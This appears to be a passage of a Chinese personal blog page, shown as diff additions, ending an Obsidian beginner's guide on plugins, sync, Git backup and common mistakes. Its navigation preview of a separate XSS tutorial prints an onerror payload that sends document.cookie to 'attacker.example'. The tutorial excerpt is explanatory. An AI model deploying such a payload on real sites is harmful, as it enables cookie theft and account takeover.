+<td>大库全文搜索，比内置快</td>
+</tr>
+<tr>
+<td>Advanced Tables</td>
+<td>表格编辑增强</td>
+</tr>
+<tr>
+<td>Obsidian Git</td>
+<td>自动提交与备份</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="Bases-与-Dataview"><a href="#Bases-与-Dataview" class="headerlink" title="Bases 与 Dataview"></a>Bases 与 Dataview</h3><p><strong>Bases</strong> 是官方核心插件，把”一组笔记 + 它们的属性”变成可交互的数据库视图：表格、卡片、列表、看板、地图，数据始终是你本地的 Markdown 文件。<strong>Dataview</strong> 是社区插件，公式更灵活、老用户生态更大；新项目直接用 Bases 就够，需要复杂查询再上 Dataview。</p>
+<details class="toggle" style="border: 1px solid #448aff1a"><summary class="toggle-button" style="background-color: #448aff1a;">用 Dataview 做首页仪表盘</summary><div class="toggle-content"><p>在 <code>首页.md</code> 里放几个查询块，打开 Obsidian 第一眼看到的就是当前状态：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## 最近 7 天修改</span></span><br><span class="line"><span class="code">```dataview</span></span><br><span class="line"><span class="code">TABLE file.mtime AS &quot;修改时间&quot;</span></span><br><span class="line"><span class="code">WHERE file.mtime &gt;= date(today) - dur(7 days)</span></span><br><span class="line"><span class="code">SORT file.mtime DESC</span></span><br><span class="line"><span class="code">LIMIT 15</span></span><br><span class="line"><span class="code">```</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 本周待办</span></span><br><span class="line"><span class="code">```dataview</span></span><br><span class="line"><span class="code">TASK</span></span><br><span class="line"><span class="code">WHERE !completed AND due &lt;= date(today) + dur(7 days)</span></span><br><span class="line"><span class="code">```</span></span><br></pre></td></tr></table></figure>
+<p>Dataview 是<strong>只读查询</strong>，永远不会改你的文件，可以放心实验。</p>
+</div></details>
+<div class="note green icon-padding flat"><i class="note-icon far fa-bell"></i><p>Bases 和 Dataview 都依赖 YAML 属性质量。属性写得乱，视图就是一盘散沙——<strong>先规范属性，再建视图</strong>。上手时只加 3～4 列，跑通了再加公式和看板。</p>
+</div>
+<h2 id="同步与备份：别把库放进网盘按需目录"><a href="#同步与备份：别把库放进网盘按需目录" class="headerlink" title="同步与备份：别把库放进网盘按需目录"></a>同步与备份：别把库放进网盘按需目录</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>方案</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>官方 Sync</td>
+<td>端到端 AES-256 加密、版本历史、手机端体验最好</td>
+<td>收费；标准版 1 GB / 单文件 5 MB，存图片 PDF 很快吃紧</td>
+</tr>
+<tr>
+<td>iCloud Drive</td>
+<td>Mac/iOS 无缝</td>
+<td>Windows 端常出问题，不适合跨平台</td>
+</tr>
+<tr>
+<td>坚果云 / OneDrive</td>
+<td>免费额度够用</td>
+<td>移动端体验差，易产生冲突副本</td>
+</tr>
+<tr>
+<td>Git（Obsidian Git）</td>
+<td>完整历史、可回滚、纯文本天然适配</td>
+<td>手机端配置麻烦，二进制附件撑大仓库</td>
+</tr>
+<tr>
+<td>Syncthing</td>
+<td>完全自控、免费</td>
+<td>需要一台常开设备，配置门槛高</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>官方服务</th>
+<th>价格（年付）</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Sync 标准</td>
+<td>$4/月</td>
+<td>1 个库、1 GB、单文件 ≤ 5 MB、1 个月历史</td>
+</tr>
+<tr>
+<td>Sync Plus</td>
+<td>$8/月</td>
+<td>10 个库、10 GB（可扩至 100 GB）、单文件 ≤ 200 MB、1 年历史</td>
+</tr>
+<tr>
+<td>Publish</td>
+<td>$8/站点/月</td>
+<td>把笔记发布成网站</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>学生、教职员工、非营利组织员工可享 Sync 与 Publish <strong>40% 折扣</strong>，两者都支持 7 天内全额退款。</p>
+</blockquote>
+<div class="note danger flat"><p><strong>致命坑：不要把库直接放在 OneDrive / iCloud / 坚果云的”按需下载”目录里。</strong></p>
+<p>这些服务会把文件冻结成占位符，Obsidian 读取时触发下载，结果是链接莫名断裂、附件打不开、出现越滚越多的”冲突副本”、索引重建导致搜索失效。</p>
+<p>正确做法：库放本地固定目录（如 <code>D:\Vaults\知识库</code>），再用 Sync 或 Obsidian Git 做多端同步与版本管理。</p>
+</div>
+<p>最低成本的备份方案就是 Git。库根目录执行一次：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/vault</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;.obsidian/workspace*.json\n.obsidian/cache\n.trash/\n&#x27;</span> &gt; .gitignore</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;init vault&quot;</span></span><br></pre></td></tr></table></figure>
+<p><code>.gitignore</code> 的作用是忽略易变的界面状态，避免每次提交都产生无意义 diff。之后交给 Obsidian Git 定时提交推送，你就同时获得了完整历史、免费多端同步和可审计的 diff。</p>
+<div class="note green icon-padding flat"><i class="note-icon far fa-bell"></i><p>别忘了核心插件里的<strong>文件恢复</strong>——它保留快照，误删时能救急；Sync 用户还能在同步历史里直接打开受影响文件。</p>
+</div>
+<h2 id="七个新手坑"><a href="#七个新手坑" class="headerlink" title="七个新手坑"></a>七个新手坑</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>坑</th>
+<th>后果</th>
+<th>正确做法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>一上来装 20 个插件</td>
+<td>启动慢、维护成本高、升级就炸</td>
+<td>先用核心功能两周，按需再装</td>
+</tr>
+<tr>
+<td>2</td>
+<td>先设计三层文件夹体系</td>
+<td>体系很快过时，笔记塞不进去</td>
+<td>顶层 4～6 个文件夹，靠链接组织</td>
+</tr>
+<tr>
+<td>3</td>
+<td>库放进网盘按需同步目录</td>
+<td>链接断、冲突副本</td>
+<td>本地目录 + Git / Sync</td>
+</tr>
+<tr>
+<td>4</td>
+<td>用系统文件管理器重命名</td>
+<td>全库链接断裂</td>
+<td>用 Obsidian 内 <code>F2</code> 重命名</td>
+</tr>
+<tr>
+<td>5</td>
+<td>沉迷图谱视图</td>
+<td>花时间看连线，不产出内容</td>
+<td>每周看一次，当诊断工具</td>
+</tr>
+<tr>
+<td>6</td>
+<td>把 AI 原文整段存进库</td>
+<td>无来源的”正确废话”污染知识库</td>
+<td>只存验证过的结论，连同来源一起存</td>
+</tr>
+<tr>
+<td>7</td>
+<td>不做备份</td>
+<td>一次误操作全没</td>
+<td>第一天就上 Git 或 Sync</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="最后：一条能立刻执行的路"><a href="#最后：一条能立刻执行的路" class="headerlink" title="最后：一条能立刻执行的路"></a>最后：一条能立刻执行的路</h2><p>不用一次学完，按这个顺序走就行：</p>
+<ul>
+<li><strong>第 1 天</strong>：建库、做完上面 6 步、写三篇笔记并互相链接</li>
+<li><strong>第 1 周</strong>：把 Markdown 语法和双向链接用熟，养成”先写链接后建笔记”的习惯</li>
+<li><strong>第 2～3 周</strong>：规范属性和标签，建起自己的模板</li>
+<li><strong>第 1 个月</strong>：试 Bases / Canvas，按需装插件</li>
+<li><strong>之后</strong>：选一套工作流（PARA 最易上手，Zettelkasten 最出活）改一改，别照搬</li>
+</ul>
+<p>工具的价值不在于配置得多花哨，而在于它能让你在三年后还找得到、读得懂今天写的东西。</p>
+<p>参考链接：</p>
+<ul>
+<li>官网 / 下载：<a target="_blank" rel="noopener" href="https://obsidian.md">https://obsidian.md</a></li>
+<li>帮助文档：<a target="_blank" rel="noopener" href="https://help.obsidian.md">https://help.obsidian.md</a></li>
+<li>更新日志：<a target="_blank" rel="noopener" href="https://obsidian.md/changelog">https://obsidian.md/changelog</a></li>
+<li>社区插件与主题：<a target="_blank" rel="noopener" href="https://community.obsidian.md">https://community.obsidian.md</a></li>
+<li>中文论坛：<a target="_blank" rel="noopener" href="https://forum-zh.obsidian.md">https://forum-zh.obsidian.md</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.just-ok.xyz">just.ok</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.just-ok.xyz/posts/e3f80a6/">http://blog.just-ok.xyz/posts/e3f80a6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://blog.just-ok.xyz" target="_blank">just.ok的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/obsidian/">obsidian</a><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/">知识库</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0%E5%B7%A5%E5%85%B7/">笔记工具</a><a class="post-meta__tags" href="/tags/%E5%AE%9E%E7%94%A8tips/">实用tips</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过"><img class="cover" src="https://pic1.imgdb.cn/item/6908b7233203f7be00cc7958.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">XSS 漏洞详解——原理、类型、测试与绕过</div></div><div class="info-2"><div class="info-item-1">站点搜索页的回显长这样：URL 是 https://example.com/search?q=键盘，页面显示「您搜索的是：键盘」。搜索词进了页面，这是一个注入点。 把参数换成一段 HTML： 1https://example.com/search?q=&lt;img src=x onerror=alert(1)&gt; 页面不再显示这段文字，而是弹出一个对话框。输入被原样输出成了标签：&lt;img&gt; 的 src=x 加载失败，触发 onerror 里的 alert(1)，浏览器把它当代码执行了。 再把 alert(1) 换成把 Cookie 发往外部服务器的脚本： 1&lt;img src=x onerror=&quot;new Image().src=&#x27;//attacker.example/log?c=&#x27;+document.cookie&quot;&gt; 这一次没有任何可见动静——访问这个链接的已登录用户，其 Cookie 已被发往攻击者的服务器。攻击者拿着 Cookie 就能以该用户身份登录：不需要密码，不需要服务器任何权限。 这两步就是 XSS...</div></div></div></a><a class="pagination-related" href="/posts/19ab467e/" title="SQL注入详解"><img class="cover" src="https://pic1.imgdb.cn/item/6908b7e53203f7be00cc7a24.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL注入详解</div></div><div class="info-2"><div class="info-item-1">SQL注入的原理SQL注入的漏洞产生必须满足以下两个条件  参数用户可控：前端传给后端的参数内容是用户可以控制的。 参数代入数据库查询：传入的参数拼接到SQL语句，并且代入到数据库查询。  本篇中的数据库环境以MySQL为例。  MySQL的相关知识点在MySQL5.0之后，MySQL中默认添加了一个名为information_schema的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。 information_schema数据库中三个很重要的表：  information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名 information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名 information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名  mysql中注释符：# 、/**/ 、 -- mysql中常用的函数：  version()：查询数据库的版本user()：...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/98b6d68d/" title="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)"><img class="cover" src="https://pic1.imgdb.cn/item/6909bfe13203f7be00cf713f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-21</div><div class="info-item-2">搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)</div></div><div class="info-2"><div class="info-item-1">在数字化时代，图片已成为我们日常沟通和表达的主要方式。无论是社交媒体、博客还是论坛，图片都是不可或缺的元素。然而，随着图片数量的不断增加，如何高效地存储和分享图片成为了一个难题。这时候，图床应运而生，成为解决这一问题的利器。 图床什么是图床图床，顾名思义，就是存储图片的“床”。它是一种提供在线图片存储服务的工具，允许用户上传、存储和分享图片。通过图床，用户可以将图片上传到云端，然后获得一个链接，可以在任何地方分享这个链接，而不需要担心图片的存储和带宽问题。 图床搭建的多种方案 GitHub + jsDelivr CDN + PicGo  原理：利用 GitHub 的仓库（Repository）存储图件，通过 jsDelivr（全球公共 CDN）加速访问，使PicGo 作为客户端自动上传。 优点：完全免费、无需维护 缺点： jsDelivr DNS易被污染；Github服务器位于国外，直接访问速度较慢   阿里云 OSS + PicGo  原理：使用对象存储服务（OSS），直接将图片上传至服务商的服务器。 优点：国内访问速度快，稳定性极高。 缺点：如果流量大，费用会迅速上涨；OSS...</div></div></div></a><a class="pagination-related" href="/posts/4d39b1ad/" title="搜索引擎技巧"><img class="cover" src="https://pic1.imgdb.cn/item/6909bf6a3203f7be00cf703c.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-26</div><div class="info-item-2">搜索引擎技巧</div></div><div class="info-2"><div class="info-item-1">排除关键词(减号+关键词)比如说：搜锤子而不是锤子手机，即为锤子 -锤子手机 精确搜索(给关键词加双引号)比如说：想搜小苹果，而不想是苹果，就&quot;小苹果&quot; 指定网站内搜索(site:域名 关键词)比如说在知乎里搜关于小苹果的内容，即为site：zhihu.com 小苹果  这时候有的人就会问了，为什么不直接使用指定网站里的搜索功能呢？因为，有些网站的搜索功能是真的不行！我们可以将浏览器的搜索引擎作为一个外置搜索器，提高检索准确性、减少遗漏。  指定文件格式(filetype:文件格式 关键词)比如说filetype:pdf 张文显《法理学》 指定标题搜索(intitle:关键词)搜索的内容必须出现在标题里比如说：intitle:小苹果那搜索出来的网页标题就都包括小苹果,不然就会出现一些内容才会出现小苹果的网页,信息检索就很费劲 两种指定范围搜索(intext：/allintext：)(inurl：关键词)intext是指如果输入intext:小苹果那搜索出来的文章里面就必须有小苹果的内容。allintext是指如果输入allintext:小苹果 大苹果 红苹果那...</div></div></div></a><a class="pagination-related" href="/posts/a2043418/" title="论文查询tips"><img class="cover" src="https://pic1.imgdb.cn/item/6908b7e53203f7be00cc7a25.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-26</div><div class="info-item-2">论文查询tips</div></div><div class="info-2"><div class="info-item-1">Sci-hubSci-hub https://www.sci-hub.ren/  论文免费下载神器用DOI（论文编号，一串数字）号查询DO号查询网站：英文文献 http://www.crossref.org中文文献 http://www.chinadoi.cn谷歌学术 http://gugg.seek68.cn/index2.html 谷歌学术的搜索功能更强精确搜索（知道具体标题）：用DO官网搜索榴糊搜索（不知具体标题）：用谷歌学术筛选缺点  sci-jub经常会挂掉（备用 https://tool.yovisun.com/scihub/） 缺少中文文献 搜索功能差  谷歌学术谷歌学术 可以看作者主页，高引论文、H指数谷歌下载方法①：右侧【PDF】链接谷歌下载方法②：看文献的其他版本 百度学术百度学术，中文文献，可以参考文献排版 Clarivate Web of Science和谷歌不相上下的文献库，在学校使用优势  显示影响因子（认可度，越高越好，同领域对比，Q1最好） 显示领域内分区（用来评估文献质量）  知网/万方/维普知网全面万方质量高维普自然科学最常用的中文网 </div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pic1.imgdb.cn/item/67d9821888c538a9b5c04e57.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">just.ok</div><div class="author-info-description">just.ok的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">73</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/justook"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BC%98%E5%85%88%E5%88%B0%E5%BA%95%E6%84%8F%E5%91%B3%E7%9D%80%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">本地优先到底意味着什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%BF%83%E6%99%BA%E6%A8%A1%E5%9E%8B%EF%BC%9A%E5%BA%93%E3%80%81%E6%96%87%E4%BB%B6%E3%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">核心心智模型：库、文件、链接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%EF%BC%88Vault%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">库（Vault）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E6%9D%A1%E9%93%81%E5%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">三条铁律</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOC%EF%BC%9A%E5%8F%AA%E5%81%9A%E5%AF%BC%E8%88%AA%E7%9A%84%E7%AC%94%E8%AE%B0"><span class="toc-number">2.3.</span> <span class="toc-text">MOC：只做导航的笔记</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-%E5%88%86%E9%92%9F%E6%90%AD%E5%A5%BD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%93"><span class="toc-number">3.</span> <span class="toc-text">30 分钟搭好第一个库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%85%E4%BC%9A%E7%9A%84-6-%E4%B8%AA%E6%93%8D%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">必会的 6 个操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%90%91%E9%93%BE%E6%8E%A5%EF%BC%9AObsidian-%E7%9A%84%E7%81%B5%E9%AD%82"><span class="toc-number">5.</span> <span class="toc-text">双向链接：Obsidian 的灵魂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E4%B8%8E%E6%A0%87%E7%AD%BE%E6%80%8E%E4%B9%88%E5%88%86%E5%B7%A5"><span class="toc-number">6.</span> <span class="toc-text">属性与标签怎么分工</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%EF%BC%9A%E4%BB%8E%E5%86%85%E7%BD%AE%E5%88%B0-Templater"><span class="toc-number">7.</span> <span class="toc-text">模板：从内置到 Templater</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%EF%BC%9A%E5%B0%91%E8%80%8C%E5%87%86"><span class="toc-number">8.</span> <span class="toc-text">插件：少而准</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bases-%E4%B8%8E-Dataview"><span class="toc-number">8.1.</span> <span class="toc-text">Bases 与 Dataview</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%A4%87%E4%BB%BD%EF%BC%9A%E5%88%AB%E6%8A%8A%E5%BA%93%E6%94%BE%E8%BF%9B%E7%BD%91%E7%9B%98%E6%8C%89%E9%9C%80%E7%9B%AE%E5%BD%95"><span class="toc-number">9.</span> <span class="toc-text">同步与备份：别把库放进网盘按需目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E4%B8%AA%E6%96%B0%E6%89%8B%E5%9D%91"><span class="toc-number">10.</span> <span class="toc-text">七个新手坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%EF%BC%9A%E4%B8%80%E6%9D%A1%E8%83%BD%E7%AB%8B%E5%88%BB%E6%89%A7%E8%A1%8C%E7%9A%84%E8%B7%AF"><span class="toc-number">11.</span> <span class="toc-text">最后：一条能立刻执行的路</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过"><img src="https://pic1.imgdb.cn/item/6908b7233203f7be00cc7958.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS 漏洞详解——原理、类型、测试与绕过"/></a><div class="content"><a class="title" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过">XSS 漏洞详解——原理、类型、测试与绕过</a><time datetime="2026-10-27T04:30:00.000Z" title="发表于 2026-10-27 12:30:00">2026-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e3f80a6/" title="Obsidian 上手指南——从建库到长期可用"><img src="https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Obsidian 上手指南——从建库到长期可用"/></a><div class="content"><a class="title" href="/posts/e3f80a6/" title="Obsidian 上手指南——从建库到长期可用">Obsidian 上手指南——从建库到长期可用</a><time datetime="2026-10-26T09:20:00.000Z" title="发表于 2026-10-26 17:20:00">2026-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/19ab467e/" title="SQL注入详解"><img src="https://pic1.imgdb.cn/item/6908b7e53203f7be00cc7a24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入详解"/></a><div class="content"><a class="title" href="/posts/19ab467e/" title="SQL注入详解">SQL注入详解</a><time datetime="2026-09-13T10:24:09.000Z" title="发表于 2026-09-13 18:24:09">2026-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/98b6d68d/" title="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)"><img src="https://pic1.imgdb.cn/item/6909bfe13203f7be00cf713f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)"/></a><div class="content"><a class="title" href="/posts/98b6d68d/" title="搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)">搭建私人图床-typora图片自动上传(宝塔面板+lskyPro+Picgo)</a><time datetime="2026-01-21T11:07:36.000Z" title="发表于 2026-01-21 19:07:36">2026-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/96e0ecdc/" title="Win11 23H2 输入法首字母变成英文/首字母打不出汉字/首击键不被认定为拼音 临时解决方案"><img src="https://pic1.imgdb.cn/item/6908b7233203f7be00cc7959.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Win11 23H2 输入法首字母变成英文/首字母打不出汉字/首击键不被认定为拼音 临时解决方案"/></a><div class="content"><a class="title" href="/posts/96e0ecdc/" title="Win11 23H2 输入法首字母变成英文/首字母打不出汉字/首击键不被认定为拼音 临时解决方案">Win11 23H2 输入法首字母变成英文/首字母打不出汉字/首击键不被认定为拼音 临时解决方案</a><time datetime="2026-01-15T08:03:21.000Z" title="发表于 2026-01-15 16:03:21">2026-01-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨</div><div class="btn-xz-box"><a class="btn-xz" href="javascript:toRandomPost()">点击开启星辰之旅</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">猜你想看💡</p><ul class="ft-links"><li><a href="https://blog.just-ok.xyz/archives/Hexo-Github-Vercel-DeploymentTutorial.html">建站指南</a><a href="https://blog.just-ok.xyz/link">网址导航</a></li><li><a href="https://blog.just-ok.xyz/">来杯咖啡</a><a href="https://blog.just-ok.xyz/comments">留点什么</a></li><li><a href="https://blog.just-ok.xyz/about">关于博主</a><a target="_blank" rel="noopener" href="https://fe32.top/archives/">文章归档</a></li><li><a href="https://blog.just-ok.xyz/categories">文章分类</a><a href="https://blog.just-ok.xyz/tags">文章标签</a></li><li><a href="https://blog.just-ok.xyz/Gallery/">我的相册</a><a href="https://blog.just-ok.xyz/">我的追番</a></li><li><a href="https://blog.just-ok.xyz/">一些特效</a><a href="https://blog.just-ok.xyz/">一些壁纸</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://blog.id-zy.xyz/"><img src="https://pic1.imgdb.cn/item/6829891e58cb8da5c8fabff0.png" alt="zhaoyuan" title="zhaoyuan"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://qinghuidaqzp.github.io/"><img src="https://pic1.imgdb.cn/item/6922f8033203f7be00255c87.jpg" alt="qinghuidaqzp" title="qinghuidaqzp"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.muooy.com/"><img src="https://www.muooy.com/favicon.png" alt="大理鱼儿" title="大理鱼儿"/></a></div><div class="img-group-item"><a target="_blank" href="https://blog.elykia.cn/" rel="external nofollow noreferrer noopener noopener"><img src="https://bu.dusays.com/2024/10/25/671b2438203a6.gif" alt="Elykia" title="Elykia"/></a></div><div class="img-group-item"><a target="_blank" href="https://blog.fiveth.cc/" rel="external nofollow noreferrer noopener noopener"><img src="https://p.fiveth.cc/avatar.png" alt="Fiveth" title="Fiveth"/></a></div></div></div></div><div class="copyright">&copy;2024 - 2026  <i id="heartbeat" class="fa fas fa-heartbeat"></i> just.ok</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
